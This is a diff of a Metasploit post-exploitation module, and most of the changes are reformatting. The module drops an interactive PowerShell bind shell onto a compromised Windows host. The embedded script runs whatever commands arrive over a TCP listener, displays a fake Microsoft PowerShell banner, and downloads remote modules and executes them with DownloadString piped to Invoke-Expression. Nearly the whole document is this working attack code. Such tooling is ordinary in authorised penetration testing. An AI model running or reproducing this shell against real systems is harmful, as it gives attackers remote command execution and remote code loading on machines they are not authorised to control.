@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Post
       'SessionTypes'         => ['meterpreter'],
       'DisclosureDate'=> "Apr 15 2015",
       'Author'               => [
-        'Ben Turner', # changed module to load interactive powershell via bind tcp 
+        'Ben Turner', # changed module to load interactive powershell via bind tcp
         'Dave Hardy', # changed module to load interactive powershell via bind tcp and load other powershell modules
         'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
         'RageLtMan' # post module
@@ -114,110 +114,105 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-	@client = client
+    @client = client
+    if (datastore['LOAD_MODULES'].empty?)
+      modsall = ''
+    else
+      print_status("Loading the following modules into the interactive PowerShell session:")
+      modsall = ''
+      modstemp = datastore['LOAD_MODULES'].to_s
+      modsarray = modstemp.split(',')
+      modsarray.each do |mod|
+      print_good(mod.to_s)
+      if mod == modsarray.last
+         modsall = modsall + "\"" + mod.to_s + "\""
+      else
+         modsall = modsall + "\"" + mod.to_s + "\",\n"
+      end
+      end
+      print("\n")
+    end
 
-	# Default parameters for payload
-	if (datastore['LOAD_MODULES'].empty?)
-	  modsall = ''
-	else
-          print_status("Loading the following modules into the interactive PowerShell session:")
-	  modsall = ''
-          modstemp = datastore['LOAD_MODULES'].to_s
-          modsarray = modstemp.split(',')
-          modsarray.each do |mod| 
-	    print_good(mod.to_s)
-            if mod == modsarray.last
-              modsall = modsall + "\"" + mod.to_s + "\""
-            else
-              modsall = modsall + "\"" + mod.to_s + "\",\n" 
-            end
-          end
-          print("\n")
-	end
-
-	script_in=""+
-	"function Get-Webclient {\n"+
-	"    $wc = New-Object Net.WebClient\n"+
-	"    $wc.UseDefaultCredentials = $true\n"+
-	"    $wc.Proxy.Credentials = $wc.Credentials\n"+
-	"    $wc\n"+
-	"}\n"+
-	"\n"+
-	"function powerfun($download) {\n"+
-	"\n"+
-	"   $modules = @("+ modsall + ")\n"+
-	"    $listener = [System.Net.Sockets.TcpListener]"+datastore['LPORT']+"\n"+
-	"    $listener.start()\n"+
-	"    [byte[]]$bytes = 0..255|%{0}\n"+
-	"    $client = $listener.AcceptTcpClient()\n"+
-	"    $stream = $client.GetStream() \n"+
-	"\n"+
+    script_in=""+
+    "function Get-Webclient {\n"+
+    "    $wc = New-Object Net.WebClient\n"+
+    "    $wc.UseDefaultCredentials = $true\n"+
+    "    $wc.Proxy.Credentials = $wc.Credentials\n"+
+    "    $wc\n"+
+    "}\n"+
+    "\n"+
+    "function powerfun($download) {\n"+
+    "\n"+
+    "   $modules = @("+ modsall + ")\n"+
+    "    $listener = [System.Net.Sockets.TcpListener]"+datastore['LPORT']+"\n"+
+    "    $listener.start()\n"+
+    "    [byte[]]$bytes = 0..255|%{0}\n"+
+    "    $client = $listener.AcceptTcpClient()\n"+
+    "    $stream = $client.GetStream() \n"+
+    "\n"+
         "$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n 'Get-Help Module-Name -Full' for more details on any module.`n 'Get-Module -ListAvailable' for a list of loaded cmdlets.`n`n\")\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
         "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
-	"\n"+
-	"    if ($download -eq 1) { ForEach ($module in $modules)\n"+
-	"    {\n"+
-	"       (Get-Webclient).DownloadString($module)|Invoke-Expression\n"+
-	"    }}\n"+
-	"\n"+
-	"    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n"+
-	"    {\n"+
-	"        $EncodedText = New-Object System.Text.ASCIIEncoding\n"+
-	"        $data = $EncodedText.GetString($bytes,0, $i)\n"+
-	"        $sendback = (Invoke-Expression $data 2>&1 | Out-String )\n"+
-	"\n"+
-	"        $sendback2  = $sendback + \"PS \" + (get-location).Path + \"> \"\n"+
-	"	 $x = ($error[0] | out-string)\n"+
-	"	 $error.clear()\n"+
-	"        $sendback2 = $sendback2 + $x\n"+
-	"\n"+
-	"        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n"+
-	"        $stream.Write($sendbyte,0,$sendbyte.Length)\n"+
-	"        $stream.Flush()  \n"+
-	"    }\n"+
-	"    $client.Close()\n"+
-	"    $listener.Stop()\n"+
-	"}\n"+
-	"\n"
+    "\n"+
+    "    if ($download -eq 1) { ForEach ($module in $modules)\n"+
+    "    {\n"+
+    "       (Get-Webclient).DownloadString($module)|Invoke-Expression\n"+
+    "    }}\n"+
+    "\n"+
+    "    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n"+
+    "    {\n"+
+    "        $EncodedText = New-Object System.Text.ASCIIEncoding\n"+
+    "        $data = $EncodedText.GetString($bytes,0, $i)\n"+
+    "        $sendback = (Invoke-Expression $data 2>&1 | Out-String )\n"+
+    "\n"+
+    "        $sendback2  = $sendback + \"PS \" + (get-location).Path + \"> \"\n"+
+    "     $x = ($error[0] | out-string)\n"+
+    "     $error.clear()\n"+
+    "        $sendback2 = $sendback2 + $x\n"+
+    "\n"+
+    "        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n"+
+    "        $stream.Write($sendbyte,0,$sendbyte.Length)\n"+
+    "        $stream.Flush()  \n"+
+    "    }\n"+
+    "    $client.Close()\n"+
+    "    $listener.Stop()\n"+
+    "}\n"+
+    "\n"
 
-	if (datastore['LOAD_MODULES'].empty?)
-	script_in = script_in + "powerfun \n" 
-	else
-	script_in = script_in + "powerfun 1\n"
-	end
+    if (datastore['LOAD_MODULES'].empty?)
+    script_in = script_in + "powerfun \n"
+    else
+    script_in = script_in + "powerfun 1\n"
+    end
 
-	# End of file marker
-	eof = Rex::Text.rand_text_alpha(8)
-	env_suffix = Rex::Text.rand_text_alpha(8)
+    # End of file marker
+    eof = Rex::Text.rand_text_alpha(8)
+    env_suffix = Rex::Text.rand_text_alpha(8)
 
-	# Get target's computer name
-	computer_name = session.sys.config.sysinfo['Computer']
+    # Get target's computer name
+    computer_name = session.sys.config.sysinfo['Computer']
 
-	# Compress the script
-	compressed_script = compress_script(script_in, eof)
-	script = compressed_script
-	cmd_out, running_pids, open_channels = execute_script(script, 15)
-	print_status("Started PowerShell on " + computer_name + ". The PID to kill once you have finished: " + running_pids[0].to_s)
+    # Compress the script
+    compressed_script = compress_script(script_in, eof)
+    script = compressed_script
+    cmd_out, running_pids, open_channels = execute_script(script, 15)
+    print_status("Started PowerShell on " + computer_name + ". The PID to kill once you have finished: " + running_pids[0].to_s)
 
-	# Default parameters for payload
-	if (datastore['RHOST'].empty?)
-	  rhost = @client.session_host
-	else
-	  rhost = datastore['RHOST']	
-	end
-	
-	if (datastore['LPORT'].empty?)
-	  rport = 55555
-	else
-	  rport = datastore['LPORT']	
-	end
+    # Default parameters for payload
+    if (datastore['RHOST'].empty?)
+      rhost = @client.session_host
+    else
+      rhost = datastore['RHOST']
+    end
 
-	set_handler(rhost,rport)
-	print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
-	print("\n")
+    if (datastore['LPORT'].empty?)
+      rport = 55555
+    else
+      rport = datastore['LPORT']
+    end
+    set_handler(rhost,rport)
+    print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
+    print("\n")
   end
-
 end
-
